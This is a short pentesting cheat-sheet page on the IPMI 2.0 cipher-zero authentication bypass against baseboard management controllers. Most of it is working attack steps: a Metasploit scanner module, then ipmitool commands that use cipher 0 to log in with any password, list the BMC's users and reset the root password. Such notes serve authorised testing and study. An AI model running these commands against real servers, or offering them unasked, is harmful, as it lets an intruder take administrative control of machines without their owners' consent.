---
title: IPMItool 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - port 623
  - ipmi
---

# IPMItool


## IPMI Authentication Bypass via Cipher 0

Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually **allows access with any password**. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations.

```msf
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```

Abuse this flaw with `ipmitool`:

```bash
# Install
apt-get install ipmitool 

# Use Cipher 0 to dump a list of users. With -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H  $ip -U root -P root user list 

# Change the password of root
ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 
```
